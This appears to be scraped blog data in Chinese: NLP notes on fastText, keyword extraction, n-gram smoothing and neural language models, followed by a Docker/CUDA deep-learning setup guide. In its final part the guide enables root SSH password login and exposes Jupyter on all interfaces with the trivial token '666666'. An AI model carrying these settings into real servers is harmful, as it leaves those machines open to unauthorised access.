而两个词向量的点乘越大，其实包含了两层含义： 第一，要求各自词向量的模越大，通常来说，除去频率非常高的词（比如停用词），对于有明确语义的词来说，它们的词向量模长会随着词频增大而增大，因此两个词共现频率越大，要求各自词向量模长越大是有直觉意义的 第二，要求这两个词向量的夹角越小，这也是符合直觉的，因为出现在同一个语境下频率越大，说明这两个词的语义越接近，因而词向量的夹角也偏向于越小。 fastText ​ word2vec 和 GloVe 都不需要人工标记的监督数据，只需要语言内部存在的监督信号即可以完成训练。而与此相对应的，fastText 则是利用带有监督标记的文本分类数据完成训练。 ​ 类似CBOW，但不同点在于： 在输入数据上，CBOW 输入的是一段区间中除去目标词之外的所有其他词的向量加和或平均，而 fastText 为了利用更多的语序信息，将 bag-of-words 变成了 bag-of-features，也就是输入 x 不再仅仅是一个词，还可以加上字符级别的 bigram 或者是 trigram 的信息等等。 第二个不同在于，CBOW 预测目标是语境中的一个词，而 fastText 预测目标是当前这段输入文本的类别，正因为需要这个文本类别，因此才说 fastText 是一个监督模型。 ​ fastText 的网络结构和 CBOW 基本一致，同时在输出层的分类上也使用了 Hierachical Softmax 技巧来加速训练。 ​ 目标函数： \\[ -\\frac{1}{N} \\sum_{n=1}^{N} y_{n} \\log f\\left(B A x_{n}\\right) \\] \\[ x_{n}=\\sum_{i=1}^{l_{n}} x_{n, i} \\] \\(x_{n, i}\\) --语料当中第 n 篇文档的第 i 个（词 或者 char N-gram） A --最终可以获取的词向量信息 词向量的作用与获取 ​ 高阶的深度学习自然语言处理任务，都可以用词向量作为基础。可以从开源链接获取。 词向量的意义 基于词与其他词的某种共现关系 skip-gram with negative-sampling 与 PMI矩阵 的等价性证明《Neural-Word-Embeddings-as-Implicit-Matrix-Factorization》 神经网络与SVD的求解方法只是降维方式的不同 神经网络更像MF，而MF与SVD的降维的约束条件不同，神经网络的目标函数与MF的目标函数也不同 GloVe与MF关系更近 目标函数更像 CBOW没有类似的降维矩阵对应 基于语言模型 词向量与语言模型本来是两个独立的NLP问题领域，因为深度学习联系在了一起。 基于词向量构建成句子向量进而进而完成语言模型的任务 基于其他监督学习任务 词向量并不只是语言模型可以得到，基于有监督学习也可以得到：C&amp;W了解 基于词向量构建成句子向量进而完成文本分类或文本相似度判断的任务 4.关键词提取 TF-IDF文本关键词抽取方法 （1） 对于给定的文本D进行分词、词性标注和去除停用词等数据预处理操作。得到n个候选关键词，即D=[t1,t2,…,tn] ； （2） 计算词语ti 在文本D中的词频； （3） 计算词语ti 在整个语料的IDF=log (Dn /(Dt +1))，Dt 为语料库中词语ti 出现的文档个数； （4） 计算得到词语ti 的TF-IDF=TF*IDF，并重复（2）—（4）得到所有候选关键词的TF-IDF数值； （5） 对候选关键词计算结果进行倒序排列，得到排名前TopN个词汇作为文本关键词。 基于TextRank的文本关键词抽取方法 （1） 对于给定的文本D进行分词、词性标注和去除停用词等数据预处理操作。得到n个候选关键词，即D=[t1,t2,…,tn] ； （2） 构建候选关键词图G=(V,E)，其中V为节点集，由候选关键词组成，并采用共现关系构造任两点之间的边，两个节点之间仅当它们对应的词汇在长度为K的窗口中共现则存在边，K表示窗口大小即最多共现K个词汇； （3） 根据公式迭代计算各节点的权重，直至收敛；(见中文文本处理部分) （4） 对节点权重进行倒序排列，得到排名前TopN个词汇作为文本关键词。 基于Word2Vec词聚类的文本关键词抽取方法 （1） 对Wiki中文语料进行Word2vec模型训练，代码 （2） 对于给定的文本D进行分词、词性标注和去除停用词等数据预处理操作。得到n个候选关键词，即D=[t1,t2,…,tn] ； （3） 遍历候选关键词，从词向量文件中抽取候选关键词的词向量表示，即WV=[v1，v2，…，vm]； （4） 对候选关键词进行K-Means聚类，得到各个类别的聚类中心； （5） 计算各类别下，组内词语与聚类中心的距离（欧几里得距离），按聚类大小进行升序排序； （6） 对候选关键词计算结果得到排名前TopN个词汇作为文本关键词。 步骤（4）中需要人为给定聚类的个数，具体参考文档主题的个数。 123456789101112131415161718192021222324252627282930from sklearn.cluster import KMeansfrom sklearn.decomposition import PCAdef getkeywords_kmeans(data,topK): words = data[\"word\"] # 词汇 vecs = data.ix[:,1:] # 向量表示 kmeans = KMeans(n_clusters=1,random_state=10).fit(vecs) labels = kmeans.labels_ #类别结果标签 labels = pd.DataFrame(labels,columns=['label']) new_df = pd.concat([labels,vecs],axis=1) vec_center = kmeans.cluster_centers_ #聚类中心 # 计算距离（相似性） 采用欧几里得距离（欧式距离） distances = [] vec_words = np.array(vecs) # 候选关键词向量，dataFrame转array vec_center = vec_center[0] # 第一个类别聚类中心,本例只有一个类别 length = len(vec_center) # 向量维度 for index in range(len(vec_words)): # 候选关键词个数 cur_wordvec = vec_words[index] # 当前词语的词向量 dis = 0 # 向量距离 for index2 in range(length): dis += (vec_center[index2]-cur_wordvec[index2])*(vec_center[index2]-cur_wordvec[index2]) dis = math.sqrt(dis) distances.append(dis) distances = pd.DataFrame(distances,columns=['dis']) result = pd.concat([words, labels ,distances], axis=1) # 拼接词语与其对应中心点的距离 result = result.sort_values(by=\"dis\",ascending = True) # 按照距离大小进行升序排序 可使用PCA降维，但具体视效果而定。","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"NLP","slug":"Notes/NLP","permalink":"https://racleray.github.io/categories/Notes/NLP/"}],"tags":[{"name":"fastText","slug":"fastText","permalink":"https://racleray.github.io/tags/fastText/"},{"name":"word2vec","slug":"word2vec","permalink":"https://racleray.github.io/tags/word2vec/"},{"name":"representation","slug":"representation","permalink":"https://racleray.github.io/tags/representation/"}]},{"title":"语言模型","slug":"语言模型","date":"2020-07-06T14:59:57.000Z","updated":"2023-08-07T11:54:31.049Z","comments":true,"path":"posts/3423f471.html","link":"","permalink":"https://racleray.github.io/posts/3423f471.html","excerpt":"传统语言模型的相关概念记录。重点是几个平滑计数的思想，从拉普拉斯到Modified Kneser-Ney smoothing，设计得越来越复杂。","text":"自然语言处理是关于计算机科学和语言学的交叉学科，常见的研究任务包括： 分词（Word Segmentation或Word Breaker，WB） 信息抽取（Information Extraction，IE）：命名实体识别和关系抽取（Named Entity Recognition &amp; Relation Extraction，NER） 词性标注（Part Of Speech Tagging，POS） 指代消解（Coreference Resolution） 句法分析（Parsing） 词义消歧（Word Sense Disambiguation，WSD） 语音识别（Speech Recognition） 语音合成（Text To Speech，TTS） 机器翻译（Machine Translation，MT） 自动文摘（Automatic Summarization） 问答系统（Question Answering） 自然语言理解（Natural Language Understanding） OCR 信息检索（Information Retrieval，IR） 语言模型与应用 ​ 上个世纪80年代后期，机器学习算法被引入到自然语言处理中，这要归功于不断提高的计算能力。 ​ 研究主要集中在统计模型上，这种方法采用大规模的训练语料（corpus）对模型的参数进行自动的学习，和之前的基于规则的方法相比，这种方法更具鲁棒性。 语言模型 ​ 语言模型简单来讲，就是计算一个句子的概率，更确切的说是计算组成这个句子一系列词语的概率。 对一句话𝑆=𝑥1,𝑥2,𝑥3,𝑥4,𝑥5,…,𝑥𝑛S=x1,x2,x3,x4,x5,…,xn而言，它的概率 𝑃(𝑆)=𝑃(𝑥1,𝑥2,𝑥3,𝑥4,𝑥5,…,𝑥𝑛)=𝑃(𝑥1)𝑃(𝑥2|𝑥1)𝑃(𝑥3|𝑥1,𝑥2)...𝑃(𝑥𝑛|𝑥1,𝑥2,...,𝑥𝑛−1) ​ 联合概率链规则公式考虑到了所有的词和词之间的依赖关系，但是非常复杂。使用马尔科夫假设（Markov Assumption）简化：下一个词的出现仅依赖于它前面的一个或几个词。 ​ 二元语法（bigram，2-gram）: \\(P(x_1,x_2,x_3,x_4,x_5,x_6,x_7,x_8,x_9,x_{10})=P(x_1)P(x_2|x_1)P(x_3|x_2)P(x_4|x_3)..P(x_{10}|x_9)\\) ​ 三元语法（trigram，3-gram）: 𝑃(𝑥1,𝑥2,𝑥3,𝑥4,𝑥5,𝑥6,𝑥7,𝑥8,𝑥9,𝑥10)=𝑃(𝑥1)𝑃(𝑥2|𝑥1)𝑃(𝑥3|𝑥1,𝑥2)𝑃(𝑥4|𝑥2,𝑥3)×...×𝑃(𝑥10|𝑥8,𝑥9) ​ 为什么叫“语言模型”？因为这是统计学意义上的模型，又跟语言相关，所以叫语言模型。统计模型指一系列分布，参数模型指一系列可用有限个参数表示的模型。语言模型就是一种参数模型，它的参数是矩阵的所有cell。 选择N-gram的N ​ 理论上，只要有足够大的语料，n越大越好，毕竟这样考虑的信息更多 条件概率为统计计数： 𝑃(“优惠”|“发票”,“点数”)= (“发票”,“点数”，“优惠”) 出现的次数 / (“发票”,“点数”)出现的次数 实际情况往往是训练语料很有限，很容易产生数据稀疏，不满足大数定律，算出来的概率失真。比如(“发票”,“点数”，“优惠”)在训练集中竟没有出现，就会导致零概率问题。 大数定律：样本数量越多，其算术平均值就越趋近期望值。 另一方面，如果n很大，参数空间过大，产生维数灾难。假设词表的大小为100000，那么n-gram模型的参数数量为\\(100000^n\\)。这么多的参数，估计内存就不够放了。 ​ 如何选择依赖词的个数n呢？ 经验上，trigram用的最多。尽管如此，原则上，能用bigram解决，绝不使用trigram。n取≥4的情况较少。 当ｎ更大时：对下一个词出现的约束信息更多，具有更大的辨别力； 当ｎ更小时：在训练语料库中出现的次数更多，具有更可靠的统计信息，具有更高的可靠性、实用性。 N-gram语言模型应用 词性标注 词性标注是一个典型的多分类问题。 “爱”作为动词还是比较常见的。所以可以统一给“爱”分配为“动词”。这种最简单的思想非常好实现，如果准确率要求不高则也比较常用。它只需要基于词性标注语料库做一个统计就够了，连贝叶斯方法、最大似然法都不要用。 可以引入2-gram模型提升匹配的精确度。 𝑃(词性𝑖|“很”的词性（副词），“爱\") = 前面被“副词”修饰的“爱\"作为“词性𝑖”的次数 / 前面被“副词”修饰的“爱\"出现的次数；𝑖=1,2,3... 垃圾邮件识别 一个可行的思路如下： 先对邮件文本进行断句，以句尾标点符号（“。” “!” “？”等）为分隔符将邮件内容拆分成不同的句子。 用N-gram分类器判断每个句子是否为垃圾邮件中的敏感句子。 当被判断为敏感句子的数量超过一定数量（比如3个）的时候，认为整个邮件就是垃圾邮件。 根据贝叶斯公式有： 𝑃(𝑌𝑖|𝑋)∝𝑃(𝑋|𝑌𝑖)𝑃(𝑌𝑖)；𝑖=1,2 对𝑃(𝑋|𝑌𝑖)P(X|Yi) 套用2-gram模型。 则上式化简为： 𝑃(𝑌𝑖|𝑋)∝𝑃(𝑋|𝑌𝑖)𝑃(𝑌𝑖) ∝𝑃(𝑥1|𝑌𝑖)𝑃(𝑥2|𝑥1，𝑌𝑖)𝑃(𝑥3|𝑥2，𝑌𝑖)...𝑃(𝑥10|𝑥9，𝑌𝑖)𝑃(𝑌𝑖) 因为这种方法考虑到了词语前面的一个词语的信息，同时也考虑到了部分语序信息，因此区分效果会比单纯用朴素贝叶斯方法更好。 N-gram方法在实际应用中有一些tricks 从区分度来看，3-gram方法更好些。 可以考虑在其前面再添加一个句子起始符号如“”，这样我们就不必单独计算𝑃(“我”|𝑌𝑖)，而是替换为计算𝑃(“我”|“”,𝑌𝑖)。形式上与2-gram统一。 这样统计和预测起来都比较方便。(一般地，如果采用N-gram模型，可以在文本开头加入n-1个虚拟的开始符号) N-gram模型也会发生零概率问题，也需要平滑技术 中文分词 中文分词技术是“中文NLP中，最最最重要的技术之一”，重要到某搜索引擎厂有专门的team在集中精力优化这一项工作，重要到能影响双语翻译百分位的准确度，能影响某些query下搜索引擎百分位的广告收入。 中文分词也可以理解成一个多分类的问题。𝑋表示被分词的句子，用𝑌𝑖表示该句子的一个分词方案。 𝑃(𝑌𝑖|𝑋)∝𝑃(𝑋|𝑌𝑖)𝑃(𝑌𝑖)；𝑖=1,2,3... NOTE：任意假想的一种分词方式之下生成的句子总是唯一的（只需把分词之间的分界符号扔掉剩下的内容都一样）。于是可以将 𝑃(𝑋|𝑌𝑖)看作是恒等于1的。这样贝叶斯公式又进一步化简成为： 𝑃(𝑌𝑖|𝑋)∝𝑃(𝑌𝑖)；𝑖=1,2,3... 采用2-gram。于是有： 𝑃(𝑌1)=𝑃(“我司”，“可”，“办理”，“正规发票”) =𝑃(“我司”)𝑃(“可”|“我司”)𝑃(“办理”|“可”)𝑃(“正规发票”|“办理”） 𝑃(𝑌2)=𝑃(“我”，“司可办”，“理正规”，“发票”) =𝑃(“我”)𝑃(“司可办”|“我”)𝑃(“理正规”|“司可办”)𝑃(“发票”|“理正规”） 机器翻译与语音识别 N-gram语言模型在机器翻译和语音识别等顶级NLP应用中也有很大的用途。 用于判断生成的语句的后验概率相对大小。 平滑技术 拉普拉斯平滑 最简单的平滑技术是拉普拉斯平滑， 加一平滑法，其保证每个n-gram在训练语料中至少出现1次（或者加k）。 分母加上\\(k * |V|\\) Back-off方法 考虑k-1元gram 插值法 多种gram加权 一元组 \\((w_{i})\\) 出现的次数平均比二元组 \\((w_{i−1},w_{i})\\) 出现的次数要多很多，根据大数定律，它的相对频度更接近概率分布。类似地，二元组平均出现的次数比三元组要高，二元组的相对频度比三元组更接近概率分布。 同时，低阶模型的零概率问题也比高阶模型轻。 \\[P(w_i\\mid w_{i-2},w_{i-1})=\\lambda(w_{i-2},w_{i-1})\\cdot f(w_i\\mid w_{i-2},w_{i-1}) +\\lambda(w_{i-1})\\cdot f(w_i\\mid w_{i-1})+\\lambda f(w_i)\\] 其中，三个 λ 为插值权重，均为正数且和为 1。 线性插值法的效果比卡茨退避法略差，故现在已经较少使用了。 古德-图灵 在统计中相信可靠的统计数据，而对不可信的统计数据打折扣的一种概率估计方法。 古德-图灵估计的原理是： 对于没看见的事件，我们不能认为它发生的概率就是零，因此我们从概率的总量(Probability Mass)中，分配一个很小的比例给这些没有看见的事件。这样一来，看见了的事件的概率总和就小于 1了。因此，需要将所有看见了的事件概率调小一点，并且按照“越是不可信的统计折扣越多”的方法进行。 假定在语料库中出现 r 次的词有 𝑁𝑟个，特别地，未出现的词数量为 𝑁0。语料库的大小为 N。那么，很显然： \\[N=\\sum_{r=1}^{\\infty}rN_r\\] 出现 r 次的词在整个语料库中的相对频度(Relative Frequency)则是 \\(r/N_r\\)。 当 r 比较小时，它的统计可能不可靠，因此在计算那些出现 r 次的词的概率时，要使用一个更小一点的次数，是 \\(d_r\\)（而不直接使用r）。 \\[d_r = (r+1)\\cdot N_{r+1}/N_r\\] 显然 \\[\\sum_rd_r\\cdot N_r=N\\] 根据 \\(Zipf\\) 定律，一般情况下 \\(N_{r+1}&lt;N_r\\)，因而 \\(d_r&lt;r\\)，从而 \\(d_0&gt;0\\)。 \\(Zipf\\) 定律：一般来说，出现一次的词的数量比出现两次的多，出现两次的比出现三次的多，这种规律称为 Zipf定律(Zipf’s Law)，即 r 越大，词的数量 \\(N_r\\) 越小。 这样就给未出现的词赋予了一个很小的非零值，从而解决了零概率的问题。同时下调了出现频率很低的词的概率。 实际运用中，一般只对出现次数低于某个阈值的词下调频率，然后把下调得到的频率总和给未出现的词。 于是： 对于频率超过一定阈值的词，它们的概率估计就是它们在语料库中的相对频度， 对于频率小于阈值的词，它们的概率估计就小于它们的相对频度，并且出现次数越少，折扣越多 对于未看见的词，也给与了一个比较小的概率 卡茨退避法（折扣） 由前 IBM 科学家卡茨(S.M.Katz)提出。 \\(\\sum_{w_{i-1},w_i\\text{ seen}}P(w_i\\mid w_{i-1})\\lt 1\\)类似古德-图灵估计的方法。这意味着有一部分概率量没有分配出去，留给了没有看到的二元组 \\((w_{i−1},w_{i})\\)： \\[P(w_i\\mid w_{i-1})=\\begin{cases}f(w_i\\mid w_{i-1})\\quad\\text{if }N(w_{i-1},w_i) \\ge T \\\\f_{gt}(w_i\\mid w_{i-1})\\quad\\text{if }0\\lt N(w_{i-1},w_i)\\lt T \\\\ Q(w_{i-1})\\cdot f(w_i)\\quad\\text{otherwise}\\end{cases}\\] 其中 T 是阈值，一般在 8−10 左右，函数 \\(f_{gt}()\\) 表示经过古德-图灵估计后的相对频度。而 \\[Q(w_{i-1})=\\frac{1-\\sum_{w_i \\text{ seen}}P(w_i\\mid w_{i-1})}{\\sum_{w_i\\text{ unseen}}f(w_i)}\\] 类似地，对于三元模型，概率估计的公式如下： \\[P(w_i\\mid w_{i-2},w_{i-1})=\\begin{cases}f(w_i\\mid w_{i-2},w_{i-1})\\quad\\text{if }N(w_{i-2,}w_{i-1},w_i) \\ge T \\\\f_{gt}(w_i\\mid w_{i-2,}w_{i-1})\\quad\\text{if }0\\lt N(w_{i-2},w_{i-1},w_i)\\lt T \\\\ Q(w_{i-2},w_{i-1})\\cdot P(w_i\\mid w_{i-1})\\quad\\text{otherwise}\\end{cases}\\] Absolute discounting Absolute discounting 包括了对高阶和低阶模型的差值，然而它并不是用高阶模型的 P 乘以一个 lambda，而是从每个非零计数里减掉一个固定的 discount δ∈[0,1]，作为test set的计数。 image image Kneser-Ney smoothing Absolute discounting 的一个扩展，对回退部分做了一个修正。 只有在高阶模型的计数很小或者为 0 时，低阶模型才显得重要，(只有在 bigram 没有出现过时，unigram 才有用)。针对该目的进行优化。 目的： capture the diversity of contexts for the word。 image Modified Kneser-Ney smoothing 根据高阶模型（k元）的相对大小，对低阶模型得到的部分进行比例分配。 目前在很多情况下，效果最好的平滑方法。 KenLM工具构建语言模型 https://kheafield.com/code/kenlm/ ​ 使用了Modified Kneser-Ney smoothing的语言模型工具包。安装和使用见notebook。 1pip install https://github.com/kpu/kenlm/archive/master.zip 神经语言预训练语言模型 BERT，GPT等，同样可以应用在以上领域。相关部分在后面笔记中给出。 参考资料: Andrej Karpathy的RNN博客 Language Model: A Survey of the State-of-the-Art Technology 传统n-gram模型简单实用，但是数据的稀疏性和泛化能力有很大的问题。 ​ 当新的文本中出现意义相近但是没有在训练文本中出现的单词或者单词组的时候，传统离散模型无法正确计算这些训练样本中未出现的单词的应有概率，他们都会被赋予0概率预测值。 ​ 除了对未出现的单词本身进行预测非常困难之外，离散模型还依赖于固定单词组合，需要完全的模式匹配，否则也无法正确输出单词组出现的概率。 ​ 离散模型在计算上还存在“维度诅咒”的困难。假设我们的词库有一万个独立单词，对于一个包含4个单词的词组模式，潜在的单词组合多达\\(10000^4\\)。 神经网络模型：前馈神经网络模型（FFLM）和循环神经网络模型（RNNLM）。前者主要设计来解决稀疏性问题，而后者主要设计来解决泛化能力，尤其是对长上下文信息的处理。 前馈神经网络模型（FFLM） Bengio等人提出的第一个前馈神经网络模型利用一个三层，包含一个嵌入层、一个全连接层、一个输出层，的全连接神经网络模型来估计给定n-1个上文的情况下，第n个单词出现的概率。其架构如下图所示： image FFLM假设每个输入都是独立的。而循环神经网络的结构能利用文字的这种上下文序列关系。 循环神经网络模型（RNNLM） 循环神经网络模型不要求固定窗口的数据训练。 image RNN语言模型训练过程： image RNN语言模型反向传播: image 语言模型评估 困惑度（perplexity），其基本思想是给测试集的句子赋予较高概率值的语言模型较好。perplexity越小，句子概率越大，语言模型越好。 image 也就是，\\(2^{-crossentropyloss}\\) image","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"NLP","slug":"Notes/NLP","permalink":"https://racleray.github.io/categories/Notes/NLP/"}],"tags":[{"name":"language model","slug":"language-model","permalink":"https://racleray.github.io/tags/language-model/"},{"name":"smoothing","slug":"smoothing","permalink":"https://racleray.github.io/tags/smoothing/"},{"name":"KenLM","slug":"KenLM","permalink":"https://racleray.github.io/tags/KenLM/"}]},{"title":"Linux+Docker深度学习环境","slug":"Linux-Docker深度学习环境","date":"2020-07-06T14:50:10.000Z","updated":"2023-08-07T11:54:31.031Z","comments":true,"path":"posts/accc2125.html","link":"","permalink":"https://racleray.github.io/posts/accc2125.html","excerpt":"记录在Docker中搭建深度学习环境的过程。","text":"Docker中搭建深度学习环境 宿主机部分 apt源修改： 12345sudo mv /etc/apt/sources.list /etc/apt/sources.list.baklsb_release -c # 系统版本sudo vim /etc/apt/sources.list 写入 12345678910deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse 12sudo apt-get updatesudo apt-get upgrade 安装python和pip 12apt-get install python3apt-get install python3-pip 配置软连接 12ln -s /usr/local/python3/bin/python3 /usr/bin/python3ln -s /usr/local/python3/bin/pip3 /usr/bin/pip3 123456789mkdir ~/.pipcd ~/.piptouch pip.confcat &gt;&gt; ~/.pip/pip.conf &lt;&lt; EOF[global]timeout = 6000index-url = https://pypi.tuna.tsinghua.edu.cn/simpletrusted-host = pypi.tuna.tsinghua.edu.cnEOF 查询CUDA，按照官网指示安装，可选择不同方法，local或者network等 注意！！ 云主机上安装cuda时，可能需要加上 --no-opengl-libs 查询驱动版本：可手动下载安装包到本地安装 首先卸载掉之前的显卡驱动： 1apt-get remove –purge nvidia* 也可使用命令查看推荐驱动 1ubuntu-drivers devices 1sudo apt install --no-install-recommends &lt;推荐驱动&gt; 下载不了可添加ppa 123sudo add-apt-repository ppa:graphics-drivers/ppasudo apt-get updatesudo apt install &lt;推荐驱动&gt; 之前安装过cuda需要重新安装的话可以选择先卸载，以免和新的 CUDA 版本产生冲突: /usr/local/cuda/bin 目录下有一个 uninstallcuda*.pl 文件 1./uninstall_cuda_10.0.pl 可能会卸载不干净, 可以再执行命令删除cuda目录 12rm -rf /usr/bin/cudarm -rf /usr/bin/cuda-10.0 查询下载cudnn 解压下载的文件，可以看到cuda文件夹，在当前目录打开终端，执行如下命令： 12345cp cuda/include/cudnn.h /usr/local/cuda/include/cp cuda/lib64/libcudnn* /usr/local/cuda/lib64/chmod a+r /usr/local/cuda/include/cudnn.hchmod a+r /usr/local/cuda/lib64/libcudnn* 网络下载速度快也可以参考tensorflow官网的教程： 12345678910111213141516171819202122232425# https://www.tensorflow.org/install/gpu#install_cuda_with_apt# Add NVIDIA package repositorieswget https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64/cuda-repo-ubuntu1804_10.1.243-1_amd64.debsudo dpkg -i cuda-repo-ubuntu1804_10.1.243-1_amd64.debsudo apt-key adv --fetch-keys https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64/7fa2af80.pubsudo apt-get updatewget http://developer.download.nvidia.com/compute/machine-learning/repos/ubuntu1804/x86_64/nvidia-machine-learning-repo-ubuntu1804_1.0.0-1_amd64.debsudo apt install ./nvidia-machine-learning-repo-ubuntu1804_1.0.0-1_amd64.debsudo apt-get update# Install NVIDIA driversudo apt-get install --no-install-recommends nvidia-driver-418 # 可更改为推荐版本# Reboot. Check that GPUs are visible using the command: nvidia-smi# Install development and runtime libraries (~4GB)sudo apt-get install --no-install-recommends --no-opengl-libs \\ cuda-10-1 \\ libcudnn7=7.6.4.38-1+cuda10.1 \\ libcudnn7-dev=7.6.4.38-1+cuda10.1# 执行inference加速的服务器安装，也可开发调试# Install TensorRT. Requires that libcudnn7 is installed above.sudo apt-get install -y --no-install-recommends libnvinfer6=6.0.1-1+cuda10.1 \\ libnvinfer-dev=6.0.1-1+cuda10.1 \\ libnvinfer-plugin6=6.0.1-1+cuda10.1 云主机挂载新分区 查看是否有多余的盘比如/dev/vdb 1fdisk -l 如果有则进行分区 1fdisk /dev/vdb 进入交互： 1.输入 n 并按回车键：创建一个新分区。 2.输入 p 并按回车键：选择主分区。因为创建的是一个单分区数据盘，所以只需要创建主分区。 3.输入分区编号并按回车键。可以输入 1。 4.输入第一个可用的扇区编号：按回车键采用默认值 1。 5.输入最后一个扇区编号：因为这里仅创建一个分区，所以按回车键采用默认值。 6.输入 wq 并按回车键，开始分区。 12#是否有新分区 /dev/vdb1fdisk -l 挂载文件系统 12#/mnt是宿主机的目录mount /dev/vdb1 /mnt 查看挂载是否成功 1df -h Docker部分 安装docker ce，根据官网教程 目前已经不推荐使用nvidia-docker2了，直接使用 nvidia-container-toolkit 即可。 1234567# Add the package repositoriesdistribution=$(. /etc/os-release;echo $ID$VERSION_ID)curl -s -L https://nvidia.github.io/nvidia-docker/gpgkey | sudo apt-key add -curl -s -L https://nvidia.github.io/nvidia-docker/$distribution/nvidia-docker.list | sudo tee /etc/apt/sources.list.d/nvidia-docker.listsudo apt-get update &amp;&amp; sudo apt-get install -y nvidia-container-toolkitsudo systemctl restart docker Usage 12345678910111213#### Test nvidia-smi with the latest official CUDA imagedocker run --gpus all nvidia/cuda:10.0１base nvidia-smi# Start a GPU enabled container on two GPUsdocker run --gpus 2 nvidia/cuda:10.１-base nvidia-smi# Starting a GPU enabled container on specific GPUsdocker run --gpus '\"device=1,2\"' nvidia/cuda:10.１-base nvidia-smidocker run --gpus '\"device=UUID-ABCDEF,1\"' nvidia/cuda:10.１-base nvidia-smi# Specifying a capability (graphics, compute, ...) for my container# Note this is rarely if ever used this waydocker run --gpus all,capabilities=utility nvidia/cuda:10.１-base nvidia-smi nivdia官方镜像：https://gitlab.com/nvidia/container-images/cuda/blob/master/doc/supported-tags.md pytorch镜像：https://hub.docker.com/r/opencompetition/opencompetition tensorflow镜像：https://www.tensorflow.org/install/docker （Optional）修改Docker本地镜像与容器的存储位置 如果根分区太小的话 首先停掉Docker服务： 1systemctl stop docker 然后移动整个/var/lib/docker目录到目的路径： 12sudo mv /var/lib/docker &lt;目标路径&gt;sudo ln -s &lt;目标路径&gt; /var/lib/docker 然后 1systemctl start docker （Optional）修改用户密码 ubuntu的默认root密码是随机的，每次开机都会有一个新的root密码。 1sudo passwd 然后会提示输入当前用户的密码。 1su root 转为root后，修改用户密码 1sudo passwd user 常用Docker操作 image，镜像，是一个个配置好的环境。 container，容器，是image的具体实例。 docker run [-it] some-image 创建某个镜像的容器 docker ps列出当前运行的容器 docker ps -a列出所有的容器，包括运行的和不运行的 docker rm container-id删除某个容器 docker start [-i] container-id启动某个容器，必须是已经创建的 -i进入交互模式，还有一种方法：docker attach container-id CTRL+D或者输入exit，退出 docker cp [OPTIONS] CONTAINER:SRC_PATH DEST_PATH 容器到主机 docker cp [OPTIONS] SRC_PATH CONTAINER:DEST_PATH 主机到容器 eg: docker cp /home/racle/package_data nlptools:/home/deepspeed/package_data 停止、重启： docker stop container-id docker restart container-id 给镜像打标签 1docker tag &lt;image id&gt; username/imagename:version 映射 12345678sudo docker run -it / --gpus all / -p 8000:22 / -p 9999:8888 / --ipc=host / -v &lt;主机文件路径&gt;:&lt;容器文件路径&gt; / --name &lt;名称&gt; / &lt;image id&gt; -p 9999:8888 把主机的9999端口映射到容器的8888端口 -p 8000:22 留一个端口映射到容器22端口，因为SFTP默认使用22端口。 --ipc=host 让容器与主机共享内存 -v : 文件路径映射 e.g. /home/racle/dockerVol/:/home/ralce/ 或者容器启动的时候挂载目录 1--mount type&#x3D;bind,source&#x3D;paht,target&#x3D;path jupyter notebook 创建了容器之后，启动jupyter notebook： 12345678910jupyter-notebook --generate-configsed -i 's/#c.NotebookApp.allow_password_change/c.NotebookApp.allow_password_change/g' ~/.jupyter/jupyter_notebook_config.pycat &gt;&gt; ~/.jupyter/jupyter_notebook_config.py &lt;&lt; EOFc = get_config()c.NotebookApp.ip = '*'c.NotebookApp.open_browser = Falsec.NotebookApp.port = 8888c.NotebookApp.token='666666'EOF 1jupyter notebook --no-browser --ip=0.0.0.0 --notebook-dir='' --no-browser即不通过浏览器启动 --allow-root允许root模型运行 端口配置 容器里 配置SSH服务，首先安装*openssh-server*: 1apt install -y openssh-server 建立一个配置文件夹并进行必要的配置： 1234567891011$ mkdir /var/run/sshd$ sudo passwd# 这里设置的root密码，一定要记住！# 使用其他用户连接，可用root权限设置密码： passwd username# 将#PermitRootLogin prohibit-password 替换为 PermitRootLogin yes$ sed -i 's/#PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config# 将session\\s*required\\s*pam_loginuid.so 替换为 session optional pam_loginuid.so$ sed 's@session\\s*required\\s*pam_loginuid.so@session optional pam_loginuid.so@g' -i /etc/pam.d/sshd$ echo \"export VISIBLE=now\" &gt;&gt; /etc/profile 1$ sudo service ssh restart 在服务器（宿主机）上 测试刚刚新建docker容器中端口转发的22端口： 1$ sudo docker port [your_container_name] 22 NOTE：可能ssh默认开启的端口不是22，需要在/etc/ssh/sshd_config中修改 port 为 22 1netstat -tnlp # 查看当前机器开启的端口 测试能否用SSH连接到远程docker： 1$ ssh root@[your_host_ip] -p 8000 下面就可以通过pychram和jupyter远程连接服务器上的docker了 本地与服务器的端口映射，从而远程登录jupyter：(远程链接到宿主机被映射的端口)： 1ssh username@host-ip -L 8888:127.0.0.1:9999 远程可通过宿主机ip的8888端口访问jupyter docker重启时也需要重启ssh服务： 1$ sudo service ssh restart 备份 通过docker ps或者docker ps -a来查看你想备份的容器的id， 然后通过： 1docker commit -p [your-container-id] [your-backup-name] 来将your-container-id的容器创建成一个镜像快照 通过docker images就可以查看到刚刚创建好的镜像快照了 通过： 1docker save -o [path-you-want-to-save/your-backup-name.tar]] [your-backup-name] 把那个镜像打包成tar文件，保存到服务器上。 恢复： docker load -i your-backup-name.tar 1docker run -d -p 80:80 your-backup-name pycharm连接 PyCharm*Tools &gt; Deployment &gt; Configuration*, 新建一个*SFTP*服务器，名字自己取 image 输入如下图配置 image 在Mappings中配置路径，这里的路径是你本地存放代码的路径，与刚刚配置的Root 